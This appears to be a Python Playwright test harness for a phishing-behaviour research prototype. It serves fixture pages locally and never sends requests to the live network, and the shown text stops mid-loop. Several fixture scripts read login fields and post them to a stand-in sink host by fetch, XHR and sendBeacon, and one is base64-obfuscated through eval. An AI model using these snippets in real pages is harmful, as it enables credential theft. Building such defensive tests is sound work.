"""Validate a browser-behaviour prototype on built-in controlled webpages.

Install in this project's existing .venv:
  python -m pip install playwright==1.55.0
  python -m playwright install chromium
Run this file, then upload reports/browser_pilot_v1/browser_pilot_report.json.

All fixture pages, scripts and responses are supplied from memory. The browser
context intercepts every page request; none is continued to a live website.
Only clearly marked dummy strings are entered. No real dataset is loaded and
no phishing classifier is trained. A passing case validates observation logic,
not phishing accuracy. Existing scripts 09/15/model inputs stay untouched.
"""

import argparse
import base64
import csv
import hashlib
import html
import json
import platform
import re
import sys
import time
import unicodedata
from collections import Counter
from datetime import datetime, timezone
from importlib.metadata import version
from pathlib import Path
from urllib.parse import unquote, urlsplit

VERSION = "1.0"
USER_MARKER = "RESEARCH_DUMMY_USER_21@example.test"
PASSWORD_MARKER = "RESEARCH_DUMMY_PASSWORD_21"
PAGE_ORIGIN = "https://page.pilot.test"
SINK_ORIGIN = "https://sink.pilot.test"
MAX_EVENTS = 600
MAX_REQUESTS = 150
REPORT_NAME = "browser_pilot_report.json"
CHECKPOINT_NAME = "browser_pilot_checkpoint.json"

# Scope these cues to each individual field's associated labels/attributes.
# They are indicators of a requested credential, not a phishing decision.
PASSWORD_WORDS = re.compile(r"\b(?:password|passwd|pwd|passphrase|passwort|contrasena|senha|mot\s+de\s+pas{1,2}e|parola)\b", re.I)
PASS_ABBREVIATION = re.compile(r"^(?:(?:your|login|account|user)\s+){0,3}pass(?:\s+required)?$", re.I)
PASSWORD_VARIANT = re.compile(r"^p[a@][s5][s5](?:w|vv)(?:[o0*•])r(?:d|cl)$", re.I)
OTHER_PASSWORD_TERMS = ("パスワード", "密码", "密碼", "비밀번호", "كلمة المرور", "كلمه المرور", "पासवर्ड", "пароль")
IDENTITY_WORDS = re.compile(r"\b(?:email|e\s*mail|username|user\s*id|login\s*id|account\s*id|benutzername|utilisateur|adresse\s+mail)\b", re.I)
OTHER_IDENTITY_TERMS = ("メール", "用户名", "用戶名", "电子邮件", "電子郵件", "이메일", "البريد الإلكتروني", "имя пользователя")


def normalized_words(value):
    value = re.sub(r"([a-z])([A-Z])", r"\1 \2", str(value))
    return " ".join(re.sub(r"[^\w]+|_", " ", unicodedata.normalize("NFKC", value).casefold()).split())


def password_cue(value):
    raw = unicodedata.normalize("NFKC", str(value)).casefold()
    if any(term in raw for term in OTHER_PASSWORD_TERMS):
        return "multilingual_term"
    text = normalized_words(value)
    latin = "".join(c for c in unicodedata.normalize("NFKD", text) if not unicodedata.combining(c))
    if PASSWORD_WORDS.search(latin):
        return "password_word_or_phrase"
    if PASS_ABBREVIATION.fullmatch(latin):
        return "restricted_pass_abbreviation"
    # Full match on a restricted word shape, rather than fuzzy body-text search.
    candidates = [raw.strip(), re.sub(r"[\s_\-.]", "", raw)]
    candidates.extend(re.findall(r"[\w@*•]+", raw))
    if any(PASSWORD_VARIANT.fullmatch(candidate) for candidate in candidates):
        return "common_password_character_variant"
    return None


def identity_cue(value):
    raw = unicodedata.normalize("NFKC", str(value)).casefold()
    return bool(IDENTITY_WORDS.search(normalized_words(value)) or any(t in raw for t in OTHER_IDENTITY_TERMS))


def sha_file(path):
    return hashlib.sha256(path.read_bytes()).hexdigest()


def object_digest(value):
    return hashlib.sha256(json.dumps(value, sort_keys=True, separators=(",", ":"), allow_nan=False).encode()).hexdigest()


def read_json(path):
    return json.loads(path.read_text(encoding="utf-8-sig"))


def save_json(path, value):
    temporary = path.with_suffix(path.suffix + ".tmp")
    try:
        temporary.write_text(json.dumps(value, indent=2, sort_keys=True, allow_nan=False), encoding="utf-8")
        temporary.replace(path)
    finally:
        temporary.unlink(missing_ok=True)


def origin(url):
    p = urlsplit(url)
    return f"{p.scheme.lower()}://{p.netloc.lower()}"


INSTRUMENT_JS = r"""
(() => {
  const nativeTimeout = window.setTimeout;
  const started = performance.now();
  const pending = new Set();
  let emitted = 0, dropped = 0, ready = false;
  const clean = (s, n=500) => String(s || '').slice(0,n);
  const address = u => { try { return new URL(String(u),document.baseURI).href; } catch { return clean(u); } };
  function emit(kind, data={}) {
    if (emitted >= 600) { dropped++; return; }
    emitted++;
    const event = {kind,document_url:location.href,document_ms:performance.now()-started,...data};
    const promise = window.__pilot_record21(event).catch(()=>{});
    pending.add(promise); promise.finally(()=>pending.delete(promise));
  }
  function snapshot() {
    const forms = Array.from(document.forms);
    const all = Array.from(document.querySelectorAll('input,textarea'));
    const types = new Set(['text','password','email','tel','url','search','number']);
    const entries = all.filter(e=>e.tagName==='TEXTAREA'||types.has(e.type));
    const fields = entries.slice(0,150).map(e=>{
      const labels = Array.from(e.labels || []).map(l=>clean(l.textContent));
      const aria = (e.getAttribute('aria-labelledby') || '').split(/\s+/).filter(Boolean)
        .slice(0,16).map(id=>clean(document.getElementById(id)?.textContent));
      const attributes = Object.fromEntries(['id','name','placeholder','autocomplete','aria-label','title']
        .map(k=>[k,clean(e.getAttribute(k))]));
      const style = getComputedStyle(e);
      return {dom_index:all.indexOf(e),tag:e.tagName.toLowerCase(),type:e.type || 'textarea',
        attributes,label_texts:labels,aria_labelledby_texts:aria,
        form_index:e.form ? forms.indexOf(e.form) : null,
        disabled:e.disabled,rendered_visible:!!e.getClientRects().length && style.visibility!=='hidden' && style.display!=='none'};
    });
    return {document_url:location.href,document_ms:performance.now()-started,
      form_count:forms.length,entry_control_count:entries.length,fields,
      forms:forms.slice(0,50).map((f,index)=>({index,id:clean(f.id),method:f.method,
        action:f.action,cross_origin:origin(f.action)!==location.origin})),
      storage_cut:entries.length>150 || forms.length>50,trace_events_dropped:dropped};
  }
  function origin(u) { try { return new URL(u,document.baseURI).origin; } catch { return ''; } }
  window.__pilot21 = {started,snapshot,flush:()=>Promise.all(Array.from(pending))};
  document.addEventListener('DOMContentLoaded',()=>{
    ready=true;emit('dom_content_loaded',{snapshot:snapshot()});
  },{once:true});
  const observer = new MutationObserver(records=>{
    if (!ready) return;
    let forms=0, controls=0, attributes=0;
    for (const r of records) {
      if (r.type==='attributes') attributes++;
      for (const n of r.addedNodes || []) {
        if (!(n instanceof Element)) continue;
        forms += Number(n.matches('form')) + n.querySelectorAll('form').length;
        controls += Number(n.matches('input,textarea')) + n.querySelectorAll('input,textarea').length;
      }
    }
    if (forms || controls || attributes) emit('dom_mutation_after_ready',{
      forms_added:forms,controls_added:controls,attributes_changed:attributes,snapshot:snapshot()});
  });
  observer.observe(document,{subtree:true,childList:true,attributes:true,
    attributeFilter:['type','action','method','form','aria-label','aria-labelledby','placeholder']});
  for (const kind of ['input','change']) document.addEventListener(kind,e=>{
    if (e.target instanceof HTMLInputElement || e.target instanceof HTMLTextAreaElement)
      emit(kind,{field_id:clean(e.target.id),field_type:e.target.type});
  },true);
  document.addEventListener('submit',e=>{
    const f=e.target, s=e.submitter;
    if (f instanceof HTMLFormElement) emit('submit_event',{
      form_id:clean(f.id),action:s?.hasAttribute('formaction')?s.formAction:f.action,
      method:s?.hasAttribute('formmethod')?s.formMethod:f.method});
  },true);
  const submit = HTMLFormElement.prototype.submit;
  HTMLFormElement.prototype.submit = function(...args) {
    emit('form_submit_method_call',{form_id:clean(this.id),action:this.action,method:this.method});
    return Reflect.apply(submit,this,args);
  };
  const fetch = window.fetch;
  window.fetch = function(resource, options) {
    emit('fetch_call',{url:address(resource instanceof Request?resource.url:resource),method:options?.method || resource?.method || 'GET'});
    return Reflect.apply(fetch,this,arguments);
  };
  const open = XMLHttpRequest.prototype.open, send = XMLHttpRequest.prototype.send;
  const xhrInfo = new WeakMap();
  XMLHttpRequest.prototype.open = function(method,url,...rest) {
    xhrInfo.set(this,{method:String(method),url:address(url)});
    return Reflect.apply(open,this,[method,url,...rest]);
  };
  XMLHttpRequest.prototype.send = function(...args) {
    emit('xhr_send_call',xhrInfo.get(this)||{});return Reflect.apply(send,this,args);
  };
  const beacon = navigator.sendBeacon;
  navigator.sendBeacon = function(url,...args) {
    emit('send_beacon_call',{url:address(url)});return Reflect.apply(beacon,this,[url,...args]);
  };
  window.setTimeout = function(handler,delay,...args) {
    if (typeof handler!=='function') return Reflect.apply(nativeTimeout,this,[handler,delay,...args]);
    return Reflect.apply(nativeTimeout,this,[function(...passed){
      emit('timer_callback_fired',{declared_delay_ms:Number(delay)||0});
      return Reflect.apply(handler,this,passed);
    },delay,...args]);
  };
})();
"""


def enrich_snapshot(snapshot):
    fields = []
    for original in snapshot["fields"]:
        field = dict(original)
        texts = [*field["attributes"].values(), *field["label_texts"], *field["aria_labelledby_texts"]]
        hits = [{"associated_text": t, "cue": cue} for t in texts if t and (cue := password_cue(t))]
        field["native_password"] = field["type"] == "password"
        field["passwordlike"] = field["native_password"] or bool(hits)
        field["identitylike"] = field["type"] == "email" or any(identity_cue(t) for t in texts)
        field["password_cue_evidence"] = hits[:8]
        fields.append(field)
    return {**snapshot, "fields": fields,
        "native_password_count": sum(f["native_password"] for f in fields),
        "passwordlike_count": sum(f["passwordlike"] for f in fields),
        "nonnative_passwordlike_count": sum(f["passwordlike"] and not f["native_password"] for f in fields),
        "identitylike_count": sum(f["identitylike"] for f in fields)}


def document(body, script="", title="Controlled pilot page"):
    return "<!doctype html><html lang='en'><head><meta charset='utf-8'><title>" + html.escape(title) + "</title></head><body>" + body + ("<script>" + script + "</script>" if script else "") + "</body></html>"


def login_form(password_label="Password", password_type="password", action="/collect"):
    return ("<form id='login' method='post' action='" + html.escape(action, quote=True) + "'>"
        "<label for='user'>Email</label><input id='user' name='user' type='email' required>"
        "<label for='secret'>" + html.escape(password_label) + "</label>"
        "<input id='secret' name='secret' type='" + password_type + "' required>"
        "<button id='go' type='submit'>Continue</button></form>")


def cases():
    payload = "new URLSearchParams({user:document.querySelector('#user').value,secret:document.querySelector('#secret').value})"
    fetch_submit = "document.querySelector('#login').addEventListener('submit',e=>{e.preventDefault();fetch('" + SINK_ORIGIN + "/collect',{method:'POST',body:" + payload + "}).catch(()=>{});});"
    delayed = "document.addEventListener('DOMContentLoaded',()=>setTimeout(()=>{document.querySelector('#mount').innerHTML=" + json.dumps(login_form("Mot de pase", "text"), ensure_ascii=False) + ";" + fetch_submit + "},400));"
    encoded_delayed = "eval(atob(" + json.dumps(base64.b64encode(delayed.encode("utf-8")).decode("ascii")) + "));"
    xhr = "document.querySelector('#login').addEventListener('submit',e=>{e.preventDefault();const x=new XMLHttpRequest();x.open('POST','" + SINK_ORIGIN + "/collect');x.send(" + payload + ");});"
    beacon = "document.querySelector('#login').addEventListener('submit',e=>{e.preventDefault();navigator.sendBeacon('" + SINK_ORIGIN + "/collect'," + payload + ");});"
    direct = "document.querySelector('#go').addEventListener('click',e=>{e.preventDefault();document.querySelector('#login').submit();});"
    contact = "<form id='contact' method='post' action='/collect'><label for='user'>Email</label><input id='user' name='user' type='email'><label for='msg'>Message</label><textarea id='msg'></textarea><button id='go'>Send</button></form>"
    contact_js = "document.addEventListener('DOMContentLoaded',()=>setTimeout(()=>{document.querySelector('#mount').innerHTML=" + json.dumps(contact) + ";},400));"
    labels = ["YOUR LOGIN PASS", "Passw*rcl", "Mot de pase", "パスワード", "密码", "密碼", "비밀번호", "كلمة المرور", "пароль", "Contraseña", "Senha", "Passwort"]
    gallery = "".join("<label for='g" + str(n) + "'>" + html.escape(label) + "</label><input id='g" + str(n) + "' type='text'>" for n,label in enumerate(labels))
    toggle = "document.querySelector('#toggle').addEventListener('click',()=>{document.querySelector('#secret').type='text';});"
    delayed_send = "document.querySelector('#login').addEventListener('submit',e=>{e.preventDefault();setTimeout(()=>{fetch('" + SINK_ORIGIN + "/collect',{method:'POST',body:" + payload + "}).catch(()=>{});},350);});"
    rows = [
        {"id":"normal_same_origin_login","role":"ordinary_login_control","html":document(login_form()),"action":"submit","expected":{"initial_pw":1,"final_pw":1,"password_requests":1,"cross_origin_password_requests":0,"submit_events":1}},
        {"id":"delayed_text_password_form","role":"dynamic_form_scenario","html":document("<main id='mount'>Loading form</main>",delayed),"action":"submit","expected":{"initial_pw":0,"final_pw":1,"dynamic_forms":1,"password_requests":1,"cross_origin_password_requests":1,"fetch_calls":1}},
        {"id":"delayed_redirect","role":"redirect_scenario","html":document("<p>Waiting for navigation</p>","document.addEventListener('DOMContentLoaded',()=>setTimeout(()=>location.assign('"+SINK_ORIGIN+"/redirected'),450));"),"action":None,"expected":{"initial_pw":0,"final_pw":0,"redirects":1,"password_requests":0}},
        {"id":"event_driven_fetch","role":"script_submission_scenario","html":document(login_form(),fetch_submit),"action":"submit","expected":{"initial_pw":1,"final_pw":1,"password_requests":1,"cross_origin_password_requests":1,"fetch_calls":1,"submit_events":1}},
        {"id":"japanese_label_xhr","role":"multilingual_submission_scenario","html":document(login_form("パスワード","text"),xhr),"action":"submit","expected":{"initial_pw":1,"final_pw":1,"password_requests":1,"cross_origin_password_requests":1,"xhr_calls":1}},
        {"id":"arabic_label_beacon","role":"multilingual_submission_scenario","html":document(login_form("كلمة المرور","text"),beacon),"action":"submit","expected":{"initial_pw":1,"final_pw":1,"password_requests":1,"cross_origin_password_requests":1,"beacon_calls":1}},
        {"id":"direct_form_submit_method","role":"programmatic_submission_scenario","html":document(login_form(action=SINK_ORIGIN+"/collect"),direct),"action":"submit","expected":{"initial_pw":1,"final_pw":1,"password_requests":1,"cross_origin_password_requests":1,"submit_method_calls":1,"submit_events":0}},
        {"id":"ordinary_cross_origin_login","role":"ordinary_login_control","html":document(login_form(action=SINK_ORIGIN+"/collect")),"action":"submit","expected":{"initial_pw":1,"final_pw":1,"password_requests":1,"cross_origin_password_requests":1,"submit_events":1}},
        {"id":"password_article_search","role":"text_only_negative_control","html":document("<h1>Password safety</h1><p>Use a strong password. パスワード and mot de passe refer to passwords.</p><label for='q'>Search articles</label><input id='q' name='q'>"),"action":None,"expected":{"initial_pw":0,"final_pw":0,"password_requests":0}},
        {"id":"boarding_pass_and_coupon","role":"ambiguous_word_negative_control","html":document("<label for='boarding'>Boarding pass number</label><input id='boarding'><label for='discount'>Discount code</label><input id='discount'><p>Password instructions elsewhere on the page.</p>"),"action":None,"expected":{"initial_pw":0,"final_pw":0,"password_requests":0}},
        {"id":"ordinary_password_visibility_toggle","role":"ordinary_login_control","html":document(login_form()+"<button id='toggle' type='button'>Show password</button>",toggle),"action":"toggle","expected":{"initial_pw":1,"final_pw":1,"final_native_pw":0,"password_requests":0,"attribute_changes_min":1}},
        {"id":"delayed_contact_form","role":"ordinary_contact_control","html":document("<div id='mount'>Loading contact form</div>",contact_js),"action":"contact","expected":{"initial_pw":0,"final_pw":0,"dynamic_forms":1,"password_requests":0,"identity_requests":1}},
        {"id":"multilingual_label_gallery","role":"credential_label_coverage_control","html":document(gallery),"action":None,"expected":{"initial_pw":12,"final_pw":12,"final_native_pw":0,"password_requests":0}},
        {"id":"delayed_dummy_submission","role":"delayed_submission_scenario","html":document(login_form(),delayed_send),"action":"submit","expected":{"initial_pw":1,"final_pw":1,"password_requests":1,"cross_origin_password_requests":1,"fetch_calls":1,"timers_min":1}},
        {"id":"mocked_external_script_form","role":"external_script_scenario","html":document("<div id='mount'>Loading external fixture script</div><script src='/fixture.js'></script>"),"asset_js":delayed,"action":"submit","expected":{"initial_pw":0,"final_pw":1,"dynamic_forms":1,"password_requests":1,"cross_origin_password_requests":1,"external_fixture_scripts":1}},
        {"id":"encoded_delayed_form","role":"simple_encoded_script_scenario","html":document("<div id='mount'>Loading encoded fixture script</div>",encoded_delayed),"action":"submit","expected":{"initial_pw":0,"final_pw":1,"dynamic_forms":1,"password_requests":1,"cross_origin_password_requests":1,"fetch_calls":1}},
        {"id":"unknown_request_containment","role":"network_containment_control","html":document("<p>Containment probe</p>","fetch('https://outside.pilot.test/blocked').catch(()=>{});"),"action":None,"expected":{"initial_pw":0,"final_pw":0,"password_requests":0,"aborted_unknown_requests":1}},
    ]
    for row in rows:
        row["url"] = PAGE_ORIGIN + "/fixtures/" + row["id"]
        row["fixture_sha256"] = object_digest({k:v for k,v in row.items() if k != "expected"})
    return rows


def cue_checks():
    positives = ["Password","YOUR LOGIN PASS","Mot de pase","パスワード","密码","密碼","비밀번호","كلمة المرور","пароль","Contraseña","Passw*rcl","Passvvord","passw0rd"]
    negatives = ["Boarding pass number","Discount code","Passport number","Bypass code","Search articles","Username","Email","Passenger name"]
    return [{"associated_text":t,"expected_password_cue":expected,"observed_cue":password_cue(t),
             "passed":bool(password_cue(t)) == expected} for expected,values in [(True,positives),(False,negatives)] for t in values]


FEATURE_DEFINITIONS = {
    "initial_passwordlike_controls":"Credential-cued controls at the initial document's DOMContentLoaded event.",
    "maximum_passwordlike_controls":"Maximum credential-cued controls across collected browser snapshots.",
    "final_passwordlike_controls":"Credential-cued controls in the final browser snapshot.",
    "final_native_password_controls":"Final controls whose browser type is password.",
    "forms_added_after_dom_ready":"Forms observed entering the DOM after DOMContentLoaded; removals/reinsertions can contribute.",
    "controls_added_after_dom_ready":"Input/textarea elements observed entering the DOM after DOMContentLoaded.",
    "observed_attribute_changes":"Observed changes to selected field/form attributes after DOMContentLoaded.",
    "observed_input_events":"Actual input events during the deliberate dummy-data probe.",
    "observed_submit_events":"Actual browser submit events; direct form.submit() can bypass this event.",
    "observed_submit_method_calls":"Instrumented HTMLFormElement.submit calls.",
    "observed_fetch_calls":"Instrumented fetch calls, including attempts later intercepted locally.",
    "observed_xhr_send_calls":"Instrumented XMLHttpRequest.send calls.",
    "observed_beacon_calls":"Instrumented navigator.sendBeacon calls.",
    "observed_timer_callbacks":"Instrumented function-based setTimeout callbacks that actually fired.",
    "navigation_attempts_after_initial_load":"Browser navigation requests to URLs other than the initial fixture.",
    "committed_main_frame_navigations_after_initial":"Main-frame navigations committed after the initial fixture.",
    "requests_containing_dummy_identity":"Page requests whose URL or POST body contains the exact dummy identity marker.",
    "requests_containing_dummy_password":"Page requests whose URL or POST body contains the exact dummy password marker.",
    "cross_origin_requests_containing_dummy_password":"Dummy password requests to another origin; cross-origin is not the earlier dataset's site-group definition.",
    "locally_fulfilled_fixture_script_requests":"Requests for the embedded, controlled external-script fixture body.",
    "aborted_unknown_requests":"Unrecognised page requests stopped by the context route handler.",
}


def summarize_result(events, requests, navigations, initial, final):
    counts = Counter(e["kind"] for e in events)
    snapshots = [initial,final] + [e["snapshot"] for e in events if "snapshot" in e]
    return {
        "initial_passwordlike_controls":initial["passwordlike_count"],
        "maximum_passwordlike_controls":max(s["passwordlike_count"] for s in snapshots),
        "final_passwordlike_controls":final["passwordlike_count"],
        "final_native_password_controls":final["native_password_count"],
        "forms_added_after_dom_ready":sum(e.get("forms_added",0) for e in events),
        "controls_added_after_dom_ready":sum(e.get("controls_added",0) for e in events),
        "observed_attribute_changes":sum(e.get("attributes_changed",0) for e in events),
        "observed_input_events":counts["input"],"observed_submit_events":counts["submit_event"],
        "observed_submit_method_calls":counts["form_submit_method_call"],
        "observed_fetch_calls":counts["fetch_call"],"observed_xhr_send_calls":counts["xhr_send_call"],
        "observed_beacon_calls":counts["send_beacon_call"],"observed_timer_callbacks":counts["timer_callback_fired"],
        "navigation_attempts_after_initial_load":sum(r["navigation"] and not r["initial_fixture_request"] for r in requests),
        "committed_main_frame_navigations_after_initial":max(0,len(navigations)-1),
        "requests_containing_dummy_identity":sum(r["contains_dummy_identity"] for r in requests),
        "requests_containing_dummy_password":sum(r["contains_dummy_password"] for r in requests),
        "cross_origin_requests_containing_dummy_password":sum(r["contains_dummy_password"] and r["cross_origin_from_fixture"] for r in requests),
        "locally_fulfilled_fixture_script_requests":sum(r["route_action"]=="fulfilled_embedded_script" for r in requests),
        "aborted_unknown_requests":sum(r["route_action"]=="aborted_unknown_request" for r in requests),
    }


def check_case(row, features, quality):
    mapping = {"initial_pw":"initial_passwordlike_controls","final_pw":"final_passwordlike_controls",
        "final_native_pw":"final_native_password_controls","dynamic_forms":"forms_added_after_dom_ready",
        "password_requests":"requests_containing_dummy_password","identity_requests":"requests_containing_dummy_identity",
        "cross_origin_password_requests":"cross_origin_requests_containing_dummy_password",
        "submit_events":"observed_submit_events","submit_method_calls":"observed_submit_method_calls",
        "fetch_calls":"observed_fetch_calls","xhr_calls":"observed_xhr_send_calls","beacon_calls":"observed_beacon_calls",
        "redirects":"committed_main_frame_navigations_after_initial","attribute_changes_min":"observed_attribute_changes",
        "timers_min":"observed_timer_callbacks","external_fixture_scripts":"locally_fulfilled_fixture_script_requests",
        "aborted_unknown_requests":"aborted_unknown_requests"}
    checks = []
    for key,expected in row["expected"].items():
        observed = features[mapping[key]]
        passed = observed >= expected if key.endswith("_min") else observed == expected
        checks.append({"property":mapping[key],"comparison":"at_least" if key.endswith("_min") else "equal",
                       "expected":expected,"observed":observed,"passed":passed})
    checks.append({"property":"observation_not_truncated_or_failed","passed":not any(quality.values())})
    return checks


def run_case(browser, row, observe_ms, action_ms, playwright_error):
    events,requests,navigations,page_errors = [],[],[],[]
    counters = {"events_dropped":0,"requests_dropped":0}
    started = time.monotonic()
    context = browser.new_context(service_workers="block",accept_downloads=False,permissions=[])
    context.set_default_timeout(6000)

    def record_event(source, event):
        if len(events) >= MAX_EVENTS:
            counters["events_dropped"] += 1
            return
        event = dict(event)
        event["case_elapsed_ms"] = (time.monotonic()-started)*1000
        event["is_main_frame"] = source["frame"] == source["page"].main_frame
        if "snapshot" in event:
            event["snapshot"] = enrich_snapshot(event["snapshot"])
        events.append(event)

    def handle_route(route):
        request = route.request
        url = request.url
        method = request.method
        body = request.post_data or ""
        combined = unquote(url + "\n" + body)
        initial_request = url == row["url"] and method == "GET"
        item = {"url":url,"method":method,"resource_type":request.resource_type,
            "navigation":request.is_navigation_request(),"initial_fixture_request":initial_request,
            "case_elapsed_ms":(time.monotonic()-started)*1000,
            "cross_origin_from_fixture":origin(url)!=origin(row["url"]),
            "contains_dummy_identity":USER_MARKER in combined,
            "contains_dummy_password":PASSWORD_MARKER in combined,
            "post_body_characters":len(body),"page_request_sent_to_live_network":False}
        cors = {"Access-Control-Allow-Origin":PAGE_ORIGIN,"Access-Control-Allow-Methods":"GET, POST, OPTIONS",
                "Access-Control-Allow-Headers":"content-type"}
        if initial_request:
            item["route_action"] = "fulfilled_embedded_fixture"
            route.fulfill(status=200,content_type="text/html; charset=utf-8",body=row["html"])
        elif url == SINK_ORIGIN+"/redirected" and method == "GET":
            item["route_action"] = "fulfilled_embedded_redirect_target"
            route.fulfill(status=200,content_type="text/html; charset=utf-8",body=document("<p>Controlled redirect target</p>"))
        elif url == PAGE_ORIGIN+"/fixture.js" and method == "GET" and "asset_js" in row:
            item["route_action"] = "fulfilled_embedded_script"
            route.fulfill(status=200,content_type="application/javascript",body=row["asset_js"])
        elif url in (PAGE_ORIGIN+"/collect",SINK_ORIGIN+"/collect") and method in ("POST","OPTIONS"):
            item["route_action"] = "fulfilled_local_dummy_response"
            route.fulfill(status=204,headers=cors,body="")
        else:
            item["route_action"] = "aborted_unknown_request"
            route.abort()
        if len(requests)<MAX_REQUESTS:
            requests.append(item)
        else:
            counters["requests_dropped"] += 1

    try:
        context.expose_binding("__pilot_record21",record_event)
        context.add_init_script(script=INSTRUMENT_JS)
        context.route("**/*",handle_route)
        # This pilot never calls connect_to_server on a websocket route.
        context.route_web_socket("**/*",lambda ws:ws.close())
        page = context.new_page()
        page.on("pageerror",lambda error:page_errors.append(str(error)[:1500]))
        page.on("framenavigated",lambda frame:navigations.append({"url":frame.url,"case_elapsed_ms":(time.monotonic()-started)*1000}) if frame==page.main_frame and frame.url!="about:blank" else None)
        page.goto(row["url"],wait_until="domcontentloaded",timeout=6000)
        page.wait_for_function("ms => window.__pilot21 && performance.now()-window.__pilot21.started >= ms",arg=observe_ms,timeout=observe_ms+6000)
        page.evaluate("window.__pilot21.flush()")
        initial_events = [e for e in events if e["kind"]=="dom_content_loaded" and e["is_main_frame"] and e["document_url"]==row["url"]]
        if len(initial_events)!=1:
            raise ValueError("Initial DOMContentLoaded snapshot was not recorded exactly once.")
        initial = initial_events[0]["snapshot"]
        before_probe = enrich_snapshot(page.evaluate("window.__pilot21.snapshot()"))
        action = row["action"]
        if action in ("submit","contact","toggle"):
            for field in before_probe["fields"]:
                if field["disabled"] or not field["rendered_visible"]:
                    continue
                marker = PASSWORD_MARKER if field["passwordlike"] else USER_MARKER if field["identitylike"] else None
                if marker:
                    page.locator("input,textarea").nth(field["dom_index"]).fill(marker)
            selector = "#toggle" if action=="toggle" else "#go"
            page.locator(selector).click(no_wait_after=True)
        # A bounded observation window, explicitly recorded. Waiting on this
        # predicate pumps browser events; it is not a sleep or proof of quiescence.
        page.evaluate("window.__pilot21.actionObservationStarted=performance.now()")
        page.wait_for_function("ms => window.__pilot21 && performance.now()-window.__pilot21.actionObservationStarted >= ms",arg=action_ms,timeout=action_ms+6000)
        page.evaluate("window.__pilot21.flush()")
        final = enrich_snapshot(page.evaluate("window.__pilot21.snapshot()"))
        snapshots = [initial,before_probe,final]+[e["snapshot"] for e in events if "snapshot" in e]
        quality = {"snapshot_storage_cut":int(any(s["storage_cut"] for s in snapshots)),
            "trace_events_dropped":counters["events_dropped"]+max(s["trace_events_dropped"] for s in snapshots),
            "request_events_dropped":counters["requests_dropped"],"page_script_error_count":len(page_errors)}
        features = summarize_result(events,requests,navigations,initial,final)
        checks = check_case(row,features,quality)
        result = {"case_id":row["id"],"scenario_role_not_a_phishing_label":row["role"],
            "fixture_sha256":row["fixture_sha256"],"fixture_url":row["url"],
            "status":"passed" if all(c["passed"] for c in checks) else "failed",
            "case_elapsed_seconds":time.monotonic()-started,"initial_snapshot":initial,
            "before_dummy_probe_snapshot":before_probe,"final_snapshot":final,
            "behaviour_features":features,"quality":quality,"checks":checks,
            "events":events,"requests":requests,"main_frame_navigations":navigations,
            "page_script_errors":page_errors,"dummy_probe_action":action,
            "requests_were_locally_fulfilled_or_aborted":all(not r["page_request_sent_to_live_network"] for r in requests),
            "classification_performed":False}
        return result
    except playwright_error as error:
        return {"case_id":row["id"],"fixture_sha256":row["fixture_sha256"],"status":"failed",
                "error":str(error)[:4000],"events":events,"requests":requests,"page_script_errors":page_errors}
    finally:
        context.close()


def write_feature_index(path, results):
    columns = ["case_id","scenario_role_not_a_phishing_label","status",*FEATURE_DEFINITIONS]
    temporary = path.with_suffix(path.suffix+".tmp")
    try:
        with temporary.open("w",newline="",encoding="utf-8") as file:
            writer=csv.DictWriter(file,fieldnames=columns)
            writer.writeheader()
            for r in results:
                writer.writerow({"case_id":r["case_id"],"scenario_role_not_a_phishing_label":r.get("scenario_role_not_a_phishing_label",""),
                                 "status":r["status"],**r.get("behaviour_features",{})})
        temporary.replace(path)
    finally:
        temporary.unlink(missing_ok=True)


def main():
    root=Path(__file__).resolve().parent
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output-dir",type=Path,default=root/"reports/browser_pilot_v1")
    parser.add_argument("--observe-ms",type=int,default=900,help="Initial bounded observation window per document, minimum 700 ms.")
    parser.add_argument("--action-ms",type=int,default=650,help="Observation after a dummy interaction, minimum 500 ms.")
    parser.add_argument("--headed",action="store_true",help="Show the controlled Chromium pages instead of headless mode.")
    args=parser.parse_args()
    if not 700<=args.observe_ms<=10000 or not 500<=args.action_ms<=10000:
        parser.error("Use --observe-ms 700..10000 and --action-ms 500..10000.")
    try:
        from playwright.sync_api import sync_playwright,Error as PlaywrightError
    except ImportError:
        raise SystemExit("Install the pilot dependency in .venv: .\\.venv\\Scripts\\python.exe -m pip install playwright==1.55.0")
    checks=cue_checks()
    if not all(c["passed"] for c in checks):
        raise ValueError("A credential-label coverage/negative-control check failed.")
    fixture_rows=cases()
    output=args.output_dir.resolve()
    reserved=[root/"reports/features",root/"reports/features_context_v2",root/"reports/balanced",
              root/"reports/baseline_training_v1_1",root/"reports/form_context_training_v2",
              root/"reports/capture_quality_v1",Path(r"D:\new dataset\phreshphish_dataset")]
    if any(output.is_relative_to(p.resolve()) or p.resolve().is_relative_to(output) for p in reserved) or root.is_relative_to(output):
        raise ValueError("Use a separate browser-pilot output folder outside the dataset and previous result folders.")
    output.mkdir(parents=True,exist_ok=True)
    state_path=output/CHECKPOINT_NAME
    with sync_playwright() as playwright:
        try:
            browser=playwright.chromium.launch(headless=not args.headed,
                args=["--disable-background-networking","--disable-component-update","--no-first-run"])
        except PlaywrightError as error:
            raise SystemExit("Chromium could not start. Run .\\.venv\\Scripts\\python.exe -m playwright install chromium and retry.\n"+str(error))
        try:
            config={"script_version":VERSION,"script_sha256":sha_file(Path(__file__)),
                "python_version":platform.python_version(),"playwright_version":version("playwright"),
                "chromium_version":browser.version,"observe_ms":args.observe_ms,"action_ms":args.action_ms,
                "headed":args.headed,"fixture_definitions_sha256":object_digest(fixture_rows),
                "page_network_policy":"all_requests_locally_fulfilled_or_aborted_no_continue",
                "scenario_roles_are_phishing_labels":False,"clock_mode":"real_bounded_observation"}
            if state_path.exists():
                state=read_json(state_path)
                if state["config"]!=config:
                    raise ValueError("Pilot checkpoint belongs to different code, browser or settings. Choose a new --output-dir.")
            else:
                if any(output.iterdir()):
                    raise ValueError("Use an empty pilot output folder or its matching checkpoint.")
                state={"config":config,"cases":{}}
                save_json(state_path,state)
            by_id={c["id"]:c for c in fixture_rows}
            if not set(state["cases"]).issubset(by_id):
                raise ValueError("Unknown case in the pilot checkpoint.")
            for case_id,saved in state["cases"].items():
                r=saved["result"]
                if (object_digest(r)!=saved["result_digest"] or r["fixture_sha256"]!=by_id[case_id]["fixture_sha256"]
                        or r["status"]!="passed" or not all(c["passed"] for c in r["checks"])):
                    raise ValueError("A checkpointed pilot result changed or did not pass.")
            resumed=len(state["cases"])
            print(f"Browser behaviour pilot v{VERSION}: {len(fixture_rows)} controlled cases; {resumed} checkpointed.",flush=True)
            print(f"Playwright {config['playwright_version']}; Chromium {browser.version}. All page requests handled locally.",flush=True)
            results=[]
            for n,row in enumerate(fixture_rows,1):
